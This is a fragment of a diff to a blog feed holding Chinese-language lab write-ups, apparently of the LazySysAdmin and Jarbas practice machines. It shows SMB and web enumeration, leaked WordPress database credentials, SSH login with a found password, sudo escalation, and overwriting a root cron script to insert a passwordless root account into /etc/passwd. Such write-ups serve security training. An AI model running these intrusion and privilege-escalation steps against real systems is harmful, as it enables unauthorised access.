lazysysadmin</span><br><span class="line">|_  System time: 2019-05-28T00:34:48+10:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smbv2-enabled: Server supports SMBv2 protocol</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 22.90 seconds</span><br></pre></td></tr></table></figure></p>
-<p>祭出dirb <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon May 27 21:38:27 2019</span><br><span class="line">URL_BASE: http://172.17.135.63/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://172.17.135.63/ ----</span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/apache/                                                                                                                                                    </span><br><span class="line">+ http://172.17.135.63/index.html (CODE:200|SIZE:36072)                                                                                                                                        </span><br><span class="line">+ http://172.17.135.63/info.php (CODE:200|SIZE:77255)                                                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/javascript/                                                                                                                                                </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/old/                                                                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/phpmyadmin/                                                                                                                                                </span><br><span class="line">+ http://172.17.135.63/robots.txt (CODE:200|SIZE:92)                                                                                                                                           </span><br><span class="line">+ http://172.17.135.63/server-status (CODE:403|SIZE:293)                                                                                                                                       </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/<span class="built_in">test</span>/                                                                                                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/wordpress/                                                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://172.17.135.63/wp/</span><br></pre></td></tr></table></figure></p>
-<p>匿名访问smb <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [22:46:26] </span></span><br><span class="line">$ smbclient -L 172.17.135.63    </span><br><span class="line">WARNING: The <span class="string">"syslog"</span> option is deprecated</span><br><span class="line">Enter divint3<span class="string">'s password: </span></span><br><span class="line"><span class="string">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">        print$          Disk      Printer Drivers</span></span><br><span class="line"><span class="string">        share$          Disk      Sumshare</span></span><br><span class="line"><span class="string">        IPC$            IPC       IPC Service (Web server)</span></span><br><span class="line"><span class="string">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Server               Comment</span></span><br><span class="line"><span class="string">        ---------            -------</span></span><br><span class="line"><span class="string">        DESKTOP-IN4T2GV      </span></span><br><span class="line"><span class="string">        LAZYSYSADMIN         Web server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Workgroup            Master</span></span><br><span class="line"><span class="string">        ---------            -------</span></span><br><span class="line"><span class="string">        WORKGROUP            DESKTOP-IN4T2GV</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># divint3 @ Divint3 in ~ [22:20:32] </span></span><br><span class="line"><span class="string">$ smbclient //172.17.135.63/share$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WARNING: The "syslog" option is deprecated</span></span><br><span class="line"><span class="string">Enter divint3'</span>s password: </span><br><span class="line">Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Tue Aug 15 19:05:52 2017</span><br><span class="line">  ..                                  D        0  Mon Aug 14 20:34:47 2017</span><br><span class="line">  wordpress                           D        0  Tue Aug 15 19:21:08 2017</span><br><span class="line">  Backnode_files                      D        0  Mon Aug 14 20:08:26 2017</span><br><span class="line">  wp                                  D        0  Tue Aug 15 18:51:23 2017</span><br><span class="line">  deets.txt                           N      139  Mon Aug 14 20:20:05 2017</span><br><span class="line">  robots.txt                          N       92  Mon Aug 14 20:36:14 2017</span><br><span class="line">  todolist.txt                        N       79  Mon Aug 14 20:39:56 2017</span><br><span class="line">  apache                              D        0  Mon Aug 14 20:35:19 2017</span><br><span class="line">  index.html                          N    36072  Sun Aug  6 13:02:15 2017</span><br><span class="line">  info.php                            N       20  Tue Aug 15 18:55:19 2017</span><br><span class="line">  <span class="built_in">test</span>                                D        0  Mon Aug 14 20:35:10 2017</span><br><span class="line">  old                                 D        0  Mon Aug 14 20:35:13 2017</span><br><span class="line"></span><br><span class="line">                3029776 blocks of size 1024. 1237820 blocks available</span><br><span class="line">smb: \&gt; get todolist.txt </span><br><span class="line">getting file \todolist.txt of size 79 as todolist.txt (8.6 KiloBytes/sec) (average 8.6 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get deets.txt </span><br><span class="line">getting file \deets.txt of size 139 as deets.txt (5.0 KiloBytes/sec) (average 5.9 KiloBytes/sec)</span><br><span class="line">smb: \&gt; </span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> wordpress</span><br><span class="line">smb: \wordpress\&gt; ls</span><br><span class="line">  .                                   D        0  Tue Aug 15 19:21:08 2017</span><br><span class="line">  ..                                  D        0  Tue Aug 15 19:05:52 2017</span><br><span class="line">  wp-config-sample.php                N     2853  Wed Dec 16 17:58:26 2015</span><br><span class="line">  wp-trackback.php                    N     4513  Sat Oct 15 03:39:28 2016</span><br><span class="line">  wp-admin                            D        0  Thu Aug  3 05:02:02 2017</span><br><span class="line">  wp-settings.php                     N    16200  Fri Apr  7 02:01:42 2017</span><br><span class="line">  wp-blog-header.php                  N      364  Sat Dec 19 19:20:28 2015</span><br><span class="line">  index.php                           N      418  Wed Sep 25 08:18:11 2013</span><br><span class="line">  wp-cron.php                         N     3286  Mon May 25 01:26:25 2015</span><br><span class="line">  wp-links-opml.php                   N     2422  Mon Nov 21 10:46:30 2016</span><br><span class="line">  readme.html                         N     7413  Mon Dec 12 16:01:39 2016</span><br><span class="line">  wp-signup.php                       N    29924  Tue Jan 24 19:08:42 2017</span><br><span class="line">  wp-content                          D        0  Mon Aug 21 18:07:27 2017</span><br><span class="line">  license.txt                         N    19935  Tue Jan  3 01:58:42 2017</span><br><span class="line">  wp-mail.php                         N     8048  Wed Jan 11 13:13:43 2017</span><br><span class="line">  wp-activate.php                     N     5447  Wed Sep 28 05:36:28 2016</span><br><span class="line">  .htaccess                           H       35  Tue Aug 15 19:40:13 2017</span><br><span class="line">  xmlrpc.php                          N     3065  Thu Sep  1 00:31:29 2016</span><br><span class="line">  wp-login.php                        N    34327  Sat May 13 01:12:46 2017</span><br><span class="line">  wp-load.php                         N     3301  Tue Oct 25 11:15:30 2016</span><br><span class="line">  wp-comments-post.php                N     1627  Mon Aug 29 20:00:32 2016</span><br><span class="line">  wp-config.php                       N     3703  Mon Aug 21 17:25:14 2017</span><br><span class="line">  wp-includes                         D        0  Thu Aug  3 05:02:03 2017</span><br><span class="line"></span><br><span class="line">                3029776 blocks of size 1024. 1237744 blocks available</span><br><span class="line">smb: \wordpress\&gt; get wp-config.php </span><br><span class="line">getting file \wordpress\wp-config.php of size 3703 as wp-config.php (452.0 KiloBytes/sec) (average 452.0 KiloBytes/sec)</span><br><span class="line">smb: \wordpress\&gt;</span><br></pre></td></tr></table></figure> deets.txt <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CBF Remembering all these passwords.</span><br><span class="line"></span><br><span class="line">Remember to remove this file and update your password after we push out the server.</span><br><span class="line"></span><br><span class="line">Password 12345</span><br></pre></td></tr></table></figure></p>
-<p>todolist.txt <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Prevent users from being able to view to web root using the local file browser</span><br></pre></td></tr></table></figure></p>
-<p>wp-config.php的内容包含数据库配置,故下载 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span class="line"><span class="comment"> * installation. You don't have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to "wp-config.php" and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'wordpress'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'Admin'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'TogieMYSQL12345^^'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line">define(<span class="string">'DB_CHARSET'</span>, <span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don't change this if in doubt. */</span></span><br><span class="line">define(<span class="string">'DB_COLLATE'</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;<span class="doctag">@link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'AUTH_KEY'</span>,         <span class="string">'SAq-)W,-K9tFcW(=?ro4SJ5)R.mx%+@KL-I@PB&#123;&lt;-i&gt;g3n^1|E&lt;-uN|&#125;F;:PbMYJ'</span>);</span><br><span class="line">define(<span class="string">'SECURE_AUTH_KEY'</span>,  <span class="string">'u .o%Ld%m27waNqK+*`~&amp;j6~v!d7vI|OwA|hd8%r#ri_`WRIcCN-KiTSWmk)1;xG'</span>);</span><br><span class="line">define(<span class="string">'LOGGED_IN_KEY'</span>,    <span class="string">'iX^NN~N7R5Mdmeh:$iLY60r~K[)^f5vk`wGDO30r8Ns)gA17FRt2|$#S!Lq@-&lt;|`'</span>);</span><br><span class="line">define(<span class="string">'NONCE_KEY'</span>,        <span class="string">',_xAk=+)B7f_a|#J44&#125;qWca!=`s4&#123;C2.Xe&gt;sY%4Ybd5*3z9WRH-ysm=.|Gm^McvU'</span>);</span><br><span class="line">define(<span class="string">'AUTH_SALT'</span>,        <span class="string">'(:^&lt;BWwzWYx ,f^9anxD,+V+2-&amp;,VJ@@)U7CSzjv_MvD67&gt;?05ihCG]Q1K:_7Xsa'</span>);</span><br><span class="line">define(<span class="string">'SECURE_AUTH_SALT'</span>, <span class="string">'ud]&#125;&#125;0rWRMGZ+a`Hky G7|i|+c7YyH4=l#5&#123;/1R=|]PYrOmN&#123;&amp;0JuqkO=o5vyGg5'</span>);</span><br><span class="line">define(<span class="string">'LOGGED_IN_SALT'</span>,   <span class="string">'=M_DRp%vGmijIhl%K!(v&gt;:,*RR&lt;cl9ahav%&#123;q`&amp;I/0HD/$W/LK:mxR37PKh?Zzi8'</span>);</span><br><span class="line">define(<span class="string">'NONCE_SALT'</span>,       <span class="string">'ABOgE&gt;G:U;Q/hO^&gt;jBG5e96OL6+&#123;=mV,|2S~c,~dhVa!E/&amp;Q[Mc8#IgVTuXAI&#125;sY'</span>);</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$table_prefix  = <span class="string">'wp_'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the Codex.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> https://codex.wordpress.org/Debugging_in_WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">define(<span class="string">'WP_DEBUG'</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That's all, stop editing! Happy blogging. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="keyword">if</span> ( !defined(<span class="string">'ABSPATH'</span>) )</span><br><span class="line">	define(<span class="string">'ABSPATH'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dynamic site URL added by Togie */</span></span><br><span class="line">$currenthost = <span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>];</span><br><span class="line">$currentpath = preg_replace(<span class="string">'@/+$@'</span>,<span class="string">''</span>,dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>]));</span><br><span class="line">$currentpath = preg_replace(<span class="string">'/\/wp.+/'</span>,<span class="string">''</span>,$currentpath);</span><br><span class="line">define(<span class="string">'WP_HOME'</span>,$currenthost.$currentpath);</span><br><span class="line">define(<span class="string">'WP_SITEURL'</span>,$currenthost.$currentpath);</span><br><span class="line">define(<span class="string">'WP_CONTENT_URL'</span>, $currenthost.$currentpath.<span class="string">'/wp-content'</span>);</span><br><span class="line">define(<span class="string">'WP_PLUGIN_URL'</span>, $currenthost.$currentpath.<span class="string">'/wp-content/plugins'</span>);</span><br><span class="line">define(<span class="string">'DOMAIN_CURRENT_SITE'</span>, $currenthost.$currentpath );</span><br><span class="line">@define(<span class="string">'ADMIN_COOKIE_PATH'</span>, <span class="string">'./'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">'wp-settings.php'</span>);</span><br></pre></td></tr></table></figure></p>
-<p>访问http://172.17.135.63/wordpress/ 得到提示,my name is togie.</p>
-<p>ssh链接<code>ssh togie@172.17.135.63</code>密码<strong>12345</strong> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">togie@LazySysAdmin:~$ cd </span><br><span class="line">-rbash: cd: restricted</span><br></pre></td></tr></table></figure> 切换至bash</p>
-<p><code>sudo -s</code>提权到root <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">togie@LazySysAdmin:~$ sudo -s</span><br><span class="line">[sudo] password for togie: </span><br><span class="line">root@LazySysAdmin:~# whoami</span><br><span class="line">root</span><br><span class="line">root@LazySysAdmin:~# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure></p>
-<p>root依然默认使用rbash切换到bash,但是从passwd中看是bash,但是就是不能用cd <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@LazySysAdmin:/root<span class="comment"># cat proof.txt </span></span><br><span class="line">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ<span class="comment">#PT9851</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Well <span class="keyword">done</span> :)</span><br><span class="line"></span><br><span class="line">Hope you learn<span class="string">'t a few things along the way.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Regards,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Togie Mcdogie</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enjoy some random strings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851</span></span><br><span class="line"><span class="string">2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7</span></span><br><span class="line"><span class="string">pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02</span></span><br><span class="line"><span class="string">bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu</span></span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>writeup</category>
       </categories>
   </entry>
   <entry>
@@ -5230,6 +5333,25 @@ S_{OOK}(t)=a_n \cdot Acos\omega_ct
 <p>发现crontab <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"><span class="comment"># For details see man 4 crontabs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name  command to be executed</span></span><br><span class="line">*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
 <p>修改目标脚本 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"sed -i '/^root.*/a divint3::0:0:root:/root:/bin/bash'"</span> &gt; /etc/script/CleaningScript.sh</span><br></pre></td></tr></table></figure></p>
 <p>等待一会 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">su divint3</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br><span class="line">[root@jarbas /]<span class="comment"># cd /root</span></span><br><span class="line">[root@jarbas ~]<span class="comment"># cat flag.txt</span></span><br><span class="line">cat flag.txt</span><br><span class="line">Hey!</span><br><span class="line"></span><br><span class="line">Congratulations! You got it! I always knew you could <span class="keyword">do</span> it!</span><br><span class="line">This challenge was very easy, huh? =)</span><br><span class="line"></span><br><span class="line">Thanks <span class="keyword">for</span> appreciating this machine.</span><br><span class="line"></span><br><span class="line">@tiagotvrs </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@jarbas ~]<span class="comment"># cat /etc/passwd</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">divint3::0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">games:x:12:100:games:/usr/games:/sbin/nologin</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">nobody:x:99:99:Nobody:/:/sbin/nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">dbus:x:81:81:System message bus:/:/sbin/nologin</span><br><span class="line">polkitd:x:999:997:User <span class="keyword">for</span> polkitd:/:/sbin/nologin</span><br><span class="line">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span><br><span class="line">chrony:x:998:996::/var/lib/chrony:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">eder:x:1000:1000:Eder Luiz:/home/eder:/bin/bash</span><br><span class="line">apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</span><br><span class="line">mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin</span><br><span class="line">jenkins:x:997:995:Jenkins Automation Server:/var/lib/jenkins:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>靶场63</title>
+    <url>/%E9%9D%B6%E5%9C%BA63/</url>
+    <content><![CDATA[<p>先看看网站源代码 找到图片存放的位置,看到一个特殊文件名,base64解密</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AAEAAQAAAAAAAAdJAAAAJDhiNGY1YTk3LTQ3NTctNDE1Ny1hZmU4LTlhMWE4</span><br><span class="line">I$8b4f5a97-4757-4157-afe8-9a1a8</span><br></pre></td></tr></table></figure>
+<p>nmap <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [21:49:41] C:130</span></span><br><span class="line">$ nmap 172.17.135.63 -sV -Pn</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-27 21:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.63</span><br><span class="line">Host is up (0.020s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL (unauthorized)</span><br><span class="line">6667/tcp open  irc         InspIRCd</span><br><span class="line">Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.79 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [21:53:15] </span></span><br><span class="line">$ nmap 172.17.135.63 -sV -Pn -A</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-27 21:53 CST</span><br><span class="line">Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.63</span><br><span class="line">Host is up (0.015s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b5:38:66:0f:a1:ee:<span class="built_in">cd</span>:41:69:3b:82:cf:ad:a1:f7:13 (DSA)</span><br><span class="line">|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)</span><br><span class="line">|_  256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-generator: Silex v2.2.7</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_/old/ /<span class="built_in">test</span>/ /TR2/ /Backnode_files/</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Backnode</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL (unauthorized)</span><br><span class="line">6667/tcp open  irc         InspIRCd</span><br><span class="line">| irc-info: </span><br><span class="line">|   server: Admin.local</span><br><span class="line">|   users: 1.0</span><br><span class="line">|   servers: 1</span><br><span class="line">|   chans: 0</span><br><span class="line">|   lusers: 1</span><br><span class="line">|   lservers: 0</span><br><span class="line">|   <span class="built_in">source</span> ident: nmap</span><br><span class="line">|   <span class="built_in">source</span> host: 10.160.110.191</span><br><span class="line">|_  error: Closing link: (nmap@10.160.110.191) [Client exited]</span><br><span class="line">Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 40m48s, deviation: 0s, median: 40m48s</span><br><span class="line">|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: lazysysadmin</span><br><span class="line">|   NetBIOS computer name: LAZYSYSADMIN\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: lazysysadmin</span><br><span class="line">|_  System time: 